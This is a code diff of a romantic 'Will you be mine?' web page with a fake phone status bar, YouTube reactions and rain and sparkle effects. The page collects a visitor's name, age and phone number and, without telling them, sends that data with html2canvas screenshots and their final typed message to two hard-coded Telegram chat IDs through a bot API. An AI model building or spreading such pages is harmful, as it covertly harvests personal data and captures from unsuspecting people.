@@ -7,100 +7,79 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&family=Dancing+Script:wght@700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&family=Dancing+Script:wght@700&family=Playfair+Display:ital,wght@1,700&display=swap');
         
         :root { --bg: linear-gradient(135deg, #ff9a9e 0%, #fecfef 100%); --glass: rgba(255, 255, 255, 0.25); --accent: #ff4d6d; }
-        .dark-theme { --bg: linear-gradient(135deg, #0f172a 0%, #1e293b 100%); --glass: rgba(255, 255, 255, 0.05); --accent: #ff758f; }
+        .fairy-theme { --bg: linear-gradient(to bottom, #1a1a2e, #16213e, #0f3460); --glass: rgba(255, 215, 0, 0.1); --accent: #ffd700; }
 
-        body { font-family: 'Poppins', sans-serif; background: var(--bg); min-height: 100vh; transition: 0.6s; overflow: hidden; display: flex; align-items: center; justify-content: center; }
+        body { font-family: 'Poppins', sans-serif; background: var(--bg); min-height: 100vh; transition: 1.5s cubic-bezier(0.4, 0, 0.2, 1); overflow: hidden; display: flex; align-items: center; justify-content: center; }
         
-        /* Fixed System Elements for Real Screenshot */
-        .status-bar { position: fixed; top: 0; width: 100%; display: flex; justify-content: space-between; padding: 12px 24px; font-size: 12px; font-weight: 600; z-index: 500; color: white; text-shadow: 0 1px 2px rgba(0,0,0,0.2); }
-        .glass-card { background: var(--glass); backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px); border: 1px solid rgba(255, 255, 255, 0.3); border-radius: 40px; box-shadow: 0 25px 50px rgba(0,0,0,0.2); z-index: 10; transform: translateZ(0); }
+        .status-bar { position: fixed; top: 0; width: 100%; display: flex; justify-content: space-between; padding: 12px 24px; font-size: 12px; font-weight: 600; z-index: 500; color: white; }
+        .glass-card { background: var(--glass); backdrop-filter: blur(25px); border: 1px solid rgba(255, 255, 255, 0.3); border-radius: 40px; box-shadow: 0 25px 50px rgba(0,0,0,0.2); z-index: 10; transition: 1s; }
 
         /* Smooth YouTube Animation */
         #yt-header { 
             position: fixed; top: -320px; left: 0; width: 100%; height: 260px; 
             transition: transform 0.8s cubic-bezier(0.34, 1.56, 0.64, 1); 
             z-index: 400; background: #000; border-bottom: 4px solid var(--accent);
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
         }
         #yt-header.active { transform: translateY(320px); }
 
         /* Bubble Submit Button */
-        .bubble-btn {
-            animation: bubblePulse 2s infinite ease-in-out;
-            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-        @keyframes bubblePulse {
-            0%, 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 77, 109, 0.6); }
-            50% { transform: scale(1.06); box-shadow: 0 0 25px 15px rgba(255, 77, 109, 0); }
-        }
+        .bubble-btn { animation: bubblePulse 2s infinite ease-in-out; transition: 0.3s; }
+        @keyframes bubblePulse { 0%, 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 77, 109, 0.6); } 50% { transform: scale(1.06); box-shadow: 0 0 25px 15px rgba(255, 77, 109, 0); } }
 
-        /* Rain Drop Physics */
-        .drop {
-            position: absolute; width: 2px; height: 20px;
-            background: linear-gradient(transparent, rgba(255, 255, 255, 0.8));
-            top: -50px; animation: rainFall linear forwards;
-            pointer-events: none; z-index: 1000;
-        }
+        /* Water Rain Drop Physics */
+        .drop { position: absolute; width: 2px; height: 20px; background: linear-gradient(transparent, rgba(255, 255, 255, 0.8)); top: -50px; animation: rainFall linear forwards; pointer-events: none; z-index: 1000; }
         @keyframes rainFall { to { transform: translateY(110vh); } }
 
-        /* Stage Transitions */
         .hidden-stage { display: none; }
-        .thought-text { font-family: 'Dancing Script', cursive; opacity: 0; animation: fadeInThought 2s forwards; }
-        @keyframes fadeInThought { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .cursive { font-family: 'Dancing Script', cursive; }
+        .fairy-text { font-family: 'Playfair Display', serif; color: #ffd700 !important; text-shadow: 0 0 10px rgba(255,215,0,0.5); }
 
-        .orb { position: absolute; border-radius: 50%; filter: blur(80px); z-index: 0; animation: floatOrb 10s infinite alternate; }
-        @keyframes floatOrb { from { transform: translate(0,0); } to { transform: translate(30px, 40px); } }
+        /* Fairy Tale Magic Sparks */
+        .sparkle { position: absolute; background: white; border-radius: 50%; pointer-events: none; animation: spark 2s infinite; }
+        @keyframes spark { 0% { opacity: 0; transform: scale(0); } 50% { opacity: 1; transform: scale(1); } 100% { opacity: 0; transform: scale(0); } }
     </style>
 </head>
 <body id="capture-body">
-
-    <div class="orb w-72 h-72 bg-pink-400 opacity-30 top-10 left-[-50px]"></div>
-    <div class="orb w-80 h-80 bg-purple-500 opacity-20 bottom-10 right-[-50px]"></div>
 
     <div class="status-bar">
         <div id="real-clock">--:--</div>
         <div class="flex gap-2"><span>📶</span> <span id="real-battery">🔋 100%</span></div>
     </div>
 
-    <div id="yt-header">
-        <div id="player-mount" class="w-full h-full"></div>
-    </div>
+    <div id="yt-header"><div id="player-mount" class="w-full h-full"></div></div>
 
     <div class="w-full max-w-sm px-4">
         <div id="main-content" class="glass-card p-8 text-center w-full">
             
             <div id="stage-1" class="space-y-4">
                 <h1 class="text-4xl font-bold mb-6 text-white cursive">Hello Bestu! ✨</h1>
-                <input type="text" id="name" placeholder="Name" class="w-full p-4 rounded-2xl bg-white/10 border border-white/20 outline-none text-white placeholder-white/50">
-                <input type="number" id="age" placeholder="Age" class="w-full p-4 rounded-2xl bg-white/10 border border-white/20 outline-none text-white placeholder-white/50">
-                <input type="tel" id="mobile" placeholder="Phone" class="w-full p-4 rounded-2xl bg-white/10 border border-white/20 outline-none text-white placeholder-white/50">
-                <button onclick="toStage2()" class="w-full bg-pink-500 py-4 rounded-2xl font-bold text-white shadow-xl mt-4 active:scale-95 transition-transform">Start Magic ❤️</button>
+                <input type="text" id="name" placeholder="Full Name" class="w-full p-4 rounded-2xl bg-white/10 border border-white/20 outline-none text-white placeholder-white/50">
+                <input type="number" id="age" placeholder="Your Age" class="w-full p-4 rounded-2xl bg-white/10 border border-white/20 outline-none text-white placeholder-white/50">
+                <input type="tel" id="mobile" placeholder="Phone Number" class="w-full p-4 rounded-2xl bg-white/10 border border-white/20 outline-none text-white placeholder-white/50">
+                <button onclick="toStage2()" class="w-full bg-pink-500 py-4 rounded-2xl font-bold text-white shadow-xl mt-4">Begin Journey ❤️</button>
             </div>
 
             <div id="stage-2" class="hidden-stage">
                 <h1 class="text-3xl font-bold mb-10 text-white cursive">Will you be mine? ❤️</h1>
                 <div class="grid gap-4">
-                    <button onclick="handleAction('YES', '❤️')" class="bg-pink-500 py-4 rounded-2xl font-bold text-white shadow-lg active:scale-95 transition-transform">YES! 😍</button>
-                    <button onclick="handleAction('NO', '😢')" class="bg-white/10 py-4 rounded-2xl border border-white/20 text-white active:scale-95 transition-transform">No 😢</button>
-                    <button onclick="handleAction('FOOD', '🍕')" class="bg-yellow-500 py-4 rounded-2xl font-bold text-white shadow-lg active:scale-95 transition-transform">Food First 🍕</button>
+                    <button onclick="handleAction('YES')" class="bg-pink-500 py-4 rounded-2xl font-bold text-white shadow-lg">YES! 😍</button>
+                    <button onclick="handleAction('NO')" class="bg-white/10 py-4 rounded-2xl border border-white/20 text-white">No 😢</button>
+                    <button onclick="handleAction('FOOD')" class="bg-yellow-500 py-4 rounded-2xl font-bold text-white shadow-lg text-sm">Food <br><span class="text-[10px] font-light">(you will have to pay for food)</span></button>
                 </div>
             </div>
 
             <div id="stage-3" class="hidden-stage space-y-6">
-                <h2 class="text-3xl font-bold text-white cursive">One last thing... ❤️</h2>
-                <textarea id="final-reply" placeholder="A message for me?" class="w-full p-4 rounded-2xl bg-white/5 border border-white/10 text-white outline-none" rows="2"></textarea>
-                <button onclick="submitFinal()" class="bubble-btn w-full bg-pink-500 py-4 rounded-full font-bold text-white shadow-2xl">
-                    Submit Response ✅
-                </button>
+                <div class="text-white italic text-sm mb-4">"A person who truly loves you will never let you go, no matter how hard the situation is." 🕊️</div>
+                <textarea id="final-reply" placeholder="Type your thoughts..." class="w-full p-4 rounded-2xl bg-white/5 border border-white/10 text-white outline-none" rows="2"></textarea>
+                <button onclick="submitToFairyTale()" class="bubble-btn w-full bg-pink-500 py-4 rounded-full font-bold text-white shadow-2xl">Submit ✅</button>
             </div>
 
             <div id="stage-4" class="hidden-stage py-10">
-                <div class="thought-text text-2xl text-white italic leading-relaxed">
-                    "In a world full of trends, you are my classic. Thank you for being in my life." ✨
-                </div>
+                <h1 class="fairy-text text-4xl mb-6">And they lived happily...</h1>
+                <div id="fairy-thought" class="text-white text-xl cursive leading-relaxed px-2"></div>
             </div>
         </div>
     </div>
@@ -110,26 +89,22 @@
         const CHAT_IDS = ["6572151527", "7893857792"]; 
         let store = {};
 
-        // Real-time Hardware Sync
         function updateStatus() {
             const now = new Date();
             document.getElementById('real-clock').innerText = now.getHours().toString().padStart(2, '0') + ":" + now.getMinutes().toString().padStart(2, '0');
             if (navigator.getBattery) {
-                navigator.getBattery().then(bat => {
-                    document.getElementById('real-battery').innerText = `🔋 ${Math.round(bat.level * 100)}%`;
-                });
+                navigator.getBattery().then(bat => { document.getElementById('real-battery').innerText = `🔋 ${Math.round(bat.level * 100)}%`; });
             }
         }
         setInterval(updateStatus, 1000); updateStatus();
 
-        // Water Drop Rain Logic
         function triggerRain() {
-            for(let i=0; i<120; i++) {
+            for(let i=0; i<150; i++) {
                 setTimeout(() => {
                     const drop = document.createElement('div');
                     drop.className = 'drop';
                     drop.style.left = Math.random() * 100 + 'vw';
-                    drop.style.animationDuration = (Math.random() * 0.6 + 0.4) + 's';
+                    drop.style.animationDuration = (Math.random() * 0.5 + 0.5) + 's';
                     document.body.appendChild(drop);
                     setTimeout(() => drop.remove(), 1000);
                 }, i * 15);
@@ -138,42 +113,60 @@
 
         function toStage2() {
             store = { n: document.getElementById('name').value, a: document.getElementById('age').value, m: document.getElementById('mobile').value };
-            if(!store.n || !store.m) return alert("Fill details! 😊");
+            if(!store.n || !store.m) return alert("Details required! 😊");
             document.getElementById('stage-1').classList.add('hidden-stage');
             document.getElementById('stage-2').classList.remove('hidden-stage');
         }
 
-        async function handleAction(type, emoji) {
+        async function handleAction(type) {
             updateStatus();
-            // Capture Full Real-Time State
             const canvas = await html2canvas(document.body, { useCORS: true, scale: 2 });
             canvas.toBlob(async (blob) => {
                 for (const id of CHAT_IDS) {
                     const fd = new FormData();
-                    fd.append('chat_id', id);
-                    fd.append('photo', blob, 'screenshot.png');
-                    fd.append('caption', `💌 RESPONSE: ${type}\nName: ${store.n}\nAge: ${store.a}\nPhone: ${store.m}`);
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                    fd.append('chat_id', id); fd.append('photo', blob, 'shot.png');
+                    fd.append('caption', `📡 REAL-TIME: ${type}\nName: ${store.n}\nPhone: ${store.m}\nAge: ${store.a}`);
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                 }
             });
 
-            // Animated YouTube Transition
-            const videoID = type === 'YES' ? 'TK2RwQUun-U' : (type === 'FOOD' ? 'XGURSAziJjc' : 'CVEM60qkzT8');
-            document.getElementById('player-mount').innerHTML = `<iframe width="100%" height="100%" src="https://www.youtube.com/embed/${videoID}?autoplay=1&mute=0" frameborder="0" allow="autoplay"></iframe>`;
+            const vids = { 'YES': 'TK2RwQUun-U', 'FOOD': 'XGURSAziJjc', 'NO': 'CVEM60qkzT8' };
+            document.getElementById('player-mount').innerHTML = `<iframe id="yt-player" width="100%" height="100%" src="https://www.youtube.com/embed/${vids[type]}?enablejsapi=1&autoplay=1" frameborder="0" allow="autoplay"></iframe>`;
             document.getElementById('yt-header').classList.add('active');
-            
-            document.getElementById('stage-2').classList.add('hidden-stage');
-            document.getElementById('stage-3').classList.remove('hidden-stage');
+
+            // Logic: Wait for video end (Approx 15s for shorts) then show Response Bar
+            setTimeout(() => {
+                document.getElementById('yt-header').classList.remove('active');
+                document.getElementById('stage-2').classList.add('hidden-stage');
+                document.getElementById('stage-3').classList.remove('hidden-stage');
+            }, 16000); 
         }
 
-        async function submitFinal() {
-            const msg = document.getElementById('final-reply').value;
+        async function submitToFairyTale() {
+            const reply = document.getElementById('final-reply').value;
             triggerRain();
+            
+            // Send final message
             for (const id of CHAT_IDS) {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent("💬 Final Message: " + msg + "\nFrom: " + store.n)}`);
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent("💬 Final Thought: " + reply + "\nBy: " + store.n)}`);
             }
+
+            // Transform Page to Fairy Tale
+            document.body.classList.add('fairy-theme');
             document.getElementById('stage-3').classList.add('hidden-stage');
             document.getElementById('stage-4').classList.remove('hidden-stage');
+            
+            document.getElementById('fairy-thought').innerText = "Every once in a while, in the middle of an ordinary life, love gives us a fairy tale. Your message '" + reply + "' has been locked in my heart forever.";
+            
+            // Create sparkles
+            for(let i=0; i<30; i++) {
+                const s = document.createElement('div');
+                s.className = 'sparkle';
+                s.style.width = s.style.height = Math.random() * 10 + 5 + 'px';
+                s.style.left = Math.random() * 100 + 'vw';
+                s.style.top = Math.random() * 100 + 'vh';
+                document.body.appendChild(s);
+            }
         }
     </script>
 </body>
